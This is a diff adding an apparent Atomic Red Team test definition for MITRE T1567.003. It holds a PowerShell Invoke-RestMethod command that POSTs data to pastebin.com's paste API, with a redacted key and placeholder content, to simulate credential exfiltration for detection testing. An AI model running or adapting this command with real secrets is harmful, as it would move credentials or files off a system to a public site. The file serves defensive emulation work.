@@ -1,0 +1,22 @@
+attack_technique: T1567.003
+display_name: 'Exfiltration Over Web Service: Exfiltration to Text Storage Sites - Custom'
+atomic_tests:
+  - name: PowerShell Invoke-RestMethod exfil to pastebin (custom)
+    auto_generated_guid: a1b2c3d4-e5f6-7890-abcd-ef1234567890
+    description: >
+      Simulates credential exfiltration to pastebin.com via PowerShell
+      Invoke-RestMethod POST. Produces EID 1 with powershell.exe Image
+      and pastebin.com in CommandLine. API key is redacted — not executed.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        Invoke-RestMethod -Uri https://pastebin.com/api/api_post.php `
+          -Method Post `
+          -Body @{
+            api_dev_key  = "REDACTED"
+            api_option   = "paste"
+            api_paste_code = "exfil_placeholder_data"
+          }
